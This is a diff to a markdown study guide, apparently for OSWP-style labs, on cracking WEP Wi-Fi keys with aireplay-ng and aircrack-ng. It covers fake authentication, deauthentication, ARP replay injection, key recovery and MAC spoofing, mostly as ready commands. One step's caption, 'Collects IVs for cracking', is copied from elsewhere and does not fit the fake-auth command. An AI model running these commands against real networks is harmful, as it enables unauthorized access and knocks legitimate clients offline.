@@ -47,7 +47,27 @@ Collects IVs for cracking.
 
 ---
 
-## 🚀 3. ARP Replay Attack
+## 🔐 2. Fake Auth (mandatory before injection)
+
+```bash
+sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
+```
+
+Collects IVs for cracking.
+
+---
+
+## 💣 3. (Optional) Deauth Attack
+
+```bash
+sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
+```
+
+Forces a client to reconnect and trigger ARP traffic.
+
+---
+
+## 🚀 4. ARP Replay Attack
 
 
 ```bash
@@ -56,16 +76,6 @@ sudo aireplay-ng --arpreplay -b <BSSID> -h <YOUR_MAC> wlan0mon
 
 Injects ARP requests to increase `#Data`.
 `-h` needs **your** MAC not a random one. We are pretending to be a legitimate client.
-
----
-
-## 💣 4. (Optional) Deauth Attack
-
-```bash
-sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
-```
-
-Forces a client to reconnect and trigger ARP traffic.
 
 ---
 
@@ -83,7 +93,6 @@ Expected result:
 ```
 KEY FOUND! [ 12:34:56:78:90 ]
 ```
-
 ---
 
 ## 🔌 6. Connect Using wpa_supplicant
@@ -118,12 +127,78 @@ ping 192.168.1.1
 
 ---
 
-## 🧠 Extra: IP vs Gateway Explanation
+## 🧠 Extra: 
+### IP vs Gateway Explanation
 
 - **192.168.1.48** is your local IP, assigned via DHCP by the router.
 - **192.168.1.1** is usually the **gateway/router**, your exit to the rest of the network or internet.
 - Pinging `192.168.1.1` checks if you're actually connected to the router.
 - Pinging `192.168.1.48` means you're pinging yourself — useful only for internal stack checks.
+
+### Fake auth differences
+
+❓ Are these two commands the same?
+
+```bash
+sudo aireplay-ng --fakeauth 0 -a <BSSID> -h <YOUR_MAC> wlan0mon
+```
+
+vs
+
+```bash
+sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
+```
+
+No! they are not! they are similar but not the same. And here is why: 
+📌 Command 1 – One-Time Fake Auth
+
+```bash
+sudo aireplay-ng --fakeauth 0 -a <BSSID> -h <YOUR_MAC> wlan0mon
+```
+
+- Performs a **single fake authentication attempt** with 0ms timeout.
+- Registers your MAC with the target AP so it accepts injected packets.
+- Output when successful:
+
+  ```
+  Authentication successful
+  ```
+
+✅ Use this for **quick testing** or **simple APs**.  
+🚫 If the AP drops your session (timeout, range issues), injection will fail.
+
+---
+
+## 📌 Command 2 – Persistent Re-Auth
+
+```bash
+sudo aireplay-ng -1 3600 -q 10 -a <BSSID> wlan0mon
+```
+
+- `-1 3600`: re-authenticate every **3600 seconds** (1 hour).
+- `-q 10`: show status every **10 seconds**.
+- More stable for long-running injection or strict APs.
+
+✅ Recommended for **OSWP labs**, **unstable links**, or **demanding routers**.
+
+---
+
+## 🧠 TL;DR Summary
+
+| Command | Type | When to Use |
+|--------|------|-------------|
+| `--fakeauth 0` | Single shot | Quick tests, permissive routers |
+| `-1 3600 -q 10` | Persistent | Long sessions, lab setup, unstable auth |
+
+---
+
+## 💡 Pro Tip
+
+- Use **persistent fake auth** before launching `--arpreplay`.
+- If fakeauth fails:
+  - Try a different MAC with `macchanger`
+  - Move closer to the AP
+  - Add delay: `--fakeauth 60000`
 
 ---
 
